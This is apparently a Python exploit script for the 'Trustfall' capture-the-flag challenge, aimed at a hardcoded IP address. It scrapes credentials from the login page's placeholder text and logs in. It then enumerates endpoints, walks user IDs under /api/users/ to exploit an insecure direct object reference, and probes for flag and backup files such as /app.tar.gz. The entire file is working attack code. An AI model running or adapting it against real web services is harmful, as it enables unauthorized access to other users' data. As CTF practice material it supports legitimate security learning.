import requests
import re
import sys

def exploit_trustfall_challenge():
    """
    Complete automated exploitation for the Trustfall challenge
    Finds credentials, logs in, exploits IDOR vulnerability to get flag
    """
    base_url = "http://18.212.136.134:3000"
    
    print("=" * 60)
    print("TRUSTFALL CHALLENGE EXPLOITATION")
    print("=" * 60)
    
    # Step 1: Discover credentials from login page
    print("\n[*] Step 1: Discovering credentials...")
    try:
        login_page = requests.get(f"{base_url}/login")
        if login_page.status_code == 200:
            # Extract placeholder credentials from HTML
            username_match = re.search(r'placeholder="([^"]*)"[^>]*autocomplete="username"', login_page.text)
            password_match = re.search(r'placeholder="([^"]*)"[^>]*autocomplete="current-password"', login_page.text)
            
            if username_match and password_match:
                username = username_match.group(1)
                password = password_match.group(1)
                print(f"✅ Found credentials: {username}:{password}")
            else:
                # Fallback to common credentials
                username, password = "testuser", "pass123"
                print(f"⚠️  Using fallback credentials: {username}:{password}")
        else:
            print("❌ Could not access login page")
            return
    except Exception as e:
        print(f"❌ Error discovering credentials: {e}")
        return
    
    # Step 2: Login with discovered credentials
    print("\n[*] Step 2: Logging in...")
    session = requests.Session()
    login_data = {"username": username, "password": password}
    
    try:
        login_response = session.post(f"{base_url}/login", data=login_data, allow_redirects=False)
        if login_response.status_code == 302:
            print("✅ Successfully logged in!")
            # Follow redirect to main page
            session.get(f"{base_url}/")
        else:
            print("❌ Login failed")
            return
    except Exception as e:
        print(f"❌ Login error: {e}")
        return
    
    # Step 3: Discover accessible endpoints
    print("\n[*] Step 3: Discovering endpoints...")
    endpoints = [
        "/", "/profile", "/dashboard", "/user", "/users", "/api", 
        "/api/profile", "/api/user", "/api/users", "/flag", "/admin"
    ]
    
    accessible_endpoints = []
    for endpoint in endpoints:
        response = session.get(f"{base_url}{endpoint}", allow_redirects=False)
        if response.status_code in [200, 403]:  # 403 means exists but no access
            accessible_endpoints.append((endpoint, response.status_code))
    
    print("✅ Accessible endpoints:")
    for endpoint, status in accessible_endpoints:
        print(f"    {endpoint} -> {status}")
    
    # Step 4: Exploit IDOR vulnerability
    print("\n[*] Step 4: Exploiting IDOR vulnerability...")
    
    # Try different user IDs
    user_ids = [0, 1, 2, 3, "admin", "testuser", "root"]
    flag_found = False
    
    for user_id in user_ids:
        print(f"    Testing /api/users/{user_id}...")
        try:
            response = session.get(f"{base_url}/api/users/{user_id}")
            if response.status_code == 200:
                # Check for flag pattern
                flag_match = re.search(r'flag\{[^}]+\}', response.text)
                if flag_match:
                    flag = flag_match.group()
                    print(f"\n🎯 FLAG FOUND: {flag}")
                    flag_found = True
                    
                    # Also print full response for context
                    print(f"\nFull response from /api/users/{user_id}:")
                    print(response.text)
                    break
                elif len(response.text.strip()) > 0 and "flag" not in response.text.lower():
                    print(f"    User {user_id} data: {response.text.strip()}")
        except Exception as e:
            print(f"    Error testing user {user_id}: {e}")
    
    # Step 5: If flag not found in users, check other endpoints
    if not flag_found:
        print("\n[*] Step 5: Checking other endpoints for flag...")
        flag_endpoints = ["/flag", "/secret", "/debug", "/console", "/config"]
        
        for endpoint in flag_endpoints:
            response = session.get(f"{base_url}{endpoint}")
            if response.status_code == 200:
                flag_match = re.search(r'flag\{[^}]+\}', response.text)
                if flag_match:
                    flag = flag_match.group()
                    print(f"\n🎯 FLAG FOUND at {endpoint}: {flag}")
                    flag_found = True
                    break
    
    # Step 6: Check backup files
    if not flag_found:
        print("\n[*] Step 6: Checking backup files...")
        backup_files = [
            "/admin.bak", "/admin.backup", "/.admin", "/admin~",
            "/source.zip", "/backup.tar", "/app.tar.gz"
        ]
        
        for file in backup_files:
            response = session.get(f"{base_url}{file}")
            if response.status_code == 200:
                print(f"    Found backup: {file}")
                # Try to extract flag from backup content
                flag_match = re.search(r'flag\{[^}]+\}', response.text)
                if flag_match:
                    flag = flag_match.group()
                    print(f"\n🎯 FLAG FOUND in {file}: {flag}")
                    flag_found = True
                    break
    
    # Step 7: Final result
    print("\n" + "=" * 60)
    if flag_found:
        print("✅ EXPLOITATION SUCCESSFUL!")
    else:
        print("❌ Flag not found automatically")
        print("   Try manual exploration with the established session")
    
    print("=" * 60)
    
    # Return session for further manual exploration if needed
    return session, flag_found

def manual_exploration(session):
    """
    Additional manual exploration options
    """
    base_url = "http://18.212.136.134:3000"
    
    print("\n[*] Additional exploration options:")
    print("1. Test more user IDs")
    print("2. Check product catalog functionality")
    print("3. Test admin endpoints with different methods")
    
    # Test more user IDs
    print("\nTesting extended user ID range...")
    for user_id in range(0, 10):
        response = session.get(f"{base_url}/api/users/{user_id}")
        if response.status_code == 200 and len(response.text.strip()) > 0:
            print(f"User {user_id}: {response.text.strip()}")
    
    # Check if there's product data with flags
    print("\nChecking product endpoints...")
    product_endpoints = ["/api/products", "/api/items", "/api/catalog"]
    for endpoint in product_endpoints:
        response = session.get(f"{base_url}{endpoint}")
        if response.status_code == 200:
            print(f"Found: {endpoint}")
            flag_match = re.search(r'flag\{[^}]+\}', response.text)
            if flag_match:
                print(f"FLAG: {flag_match.group()}")

if __name__ == "__main__":
    print("Starting automated Trustfall challenge exploitation...")
    
    try:
        session, success = exploit_trustfall_challenge()
        
        if not success:
            print("\n[*] Starting manual exploration...")
            manual_exploration(session)
            
    except KeyboardInterrupt:
        print("\n❌ Exploitation interrupted by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")